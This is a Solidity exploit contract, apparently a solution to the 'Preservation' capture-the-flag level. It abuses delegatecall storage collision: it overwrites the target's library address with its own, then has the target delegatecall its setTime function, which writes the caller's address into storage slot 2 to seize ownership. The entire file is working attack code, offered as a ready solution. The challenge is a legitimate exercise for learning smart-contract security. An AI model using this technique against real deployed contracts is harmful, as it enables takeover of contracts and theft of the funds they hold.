// SPDX-License-Identifier: MIT

pragma solidity ^0.8.17;

import {IPreservation} from "src/hack/interfaces/IPreservation.sol";

contract PreservationHack {
    function hack(address preservationAddr) external {
        uint256 uintAddress = uint256(uint160(address(this)));

        // Set this contract address as "timeZone1Library" in Preservation contract
        IPreservation(preservationAddr).setFirstTime(uintAddress);

        // Preservation contract will delegatecall "setTime" function of this contract
        IPreservation(preservationAddr).setFirstTime(0);
    }

    function setTime(uint _time) external {
        assembly {
            // owner variable is at slot 2 in Preservation contract
            sstore(2, origin())
        }
    }
}
